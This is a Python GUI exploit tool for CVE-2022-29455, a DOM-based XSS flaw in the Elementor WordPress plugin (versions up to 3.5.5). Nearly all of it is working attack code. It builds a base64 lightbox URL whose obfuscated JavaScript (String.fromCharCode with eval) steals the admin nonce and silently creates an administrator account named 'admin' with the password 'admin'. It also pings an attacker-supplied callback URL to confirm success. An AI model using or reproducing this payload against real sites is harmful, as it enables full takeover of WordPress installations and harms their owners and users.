'''
DOM-based Reflected Cross-Site Scripting (XSS) vulnerability in Elementor's Elementor Website Builder plugin <= 3.5.5 versions.
'''

import base64
import tkinter
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
root = tkinter.Tk()
root.title("CVE_2022_29455 exploits")
root.geometry('800x600+0+0')
def printInput():
    inp = inputtxt.get(1.0, "end-1c")
    lbl.config(text = "attack url : "+inp)
    url = inp
    scroll_y = Scrollbar(root, orient=VERTICAL)
    txtarea = Text(root, yscrollcommand=scroll_y.set, font=(
            "times new roman", 15, "bold"), fg="#3206b8")
    scroll_y.pack(side=RIGHT, fill=Y)
    scroll_y.config(command=txtarea.yview)
    elementor = '/#elementor-action:action=lightbox&settings='
    username = 'admin'
    email = 'admin@gmail.com'
    password = 'admin'
    hook = inp

    acci = f' var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login={username}&email={email}&pass1={password}&pass2={password}&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);'
    ascii_values = [ord(character) for character in acci]




    final1 = str("""{"type":"video","url":"http://","videoType":"hosted","videoParams":{"onerror":"this.src='webhook';document.write('<script type=text/javascript> function codeAddress() {eval(String.fromCharCode(""")
    final1 = (final1.replace('webhook', hook + "?+Great_succes"))
    final2 = str(ascii_values)
    final2 = (final2.replace(" ","" ))
    final2 = (final2.replace( '[' ,"" ))
    final2 = (final2.replace( ']' ,"" ))
    final3 =  str (""")) }</script> <img src=x onerror=codeAddress()></img>')","style":"    background-color: white;background-image: url(https://nerdist.com/wp-content/uploads/2020/07/maxresdefault.jpg);background-size: contain;"}}""")
 

    payload = str(final1+final2+final3)
    payload_bytes = payload.encode('ascii')
    payload_bytes = base64.b64encode(payload_bytes)
    base64_payload = payload_bytes.decode('ascii')
    #print(url + elementor + base64_payload)
    txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
    txtarea.insert(END, url)
    txtarea.insert(END, elementor)
    txtarea.insert(END, base64_payload)
    txtarea.pack(fill=BOTH, expand=1)
Hacher = Label(root, text="DOM-based Reflected Cross-Site Scripting (XSS) vulnerability in Elementor's Elementor Website Builder plugin <= 3.5.5 versions.").pack()
Hacher = Label(root, text="Enter url or domin https://www.example.com/ : ").pack()
inputtxt = tk.Text(root,height = 1,width = 80)
inputtxt.pack()
printButton = tk.Button(root,text = "exploit", command = printInput)
printButton.pack()
lbl = tk.Label(root, text = "")
lbl.pack()
root.mainloop()
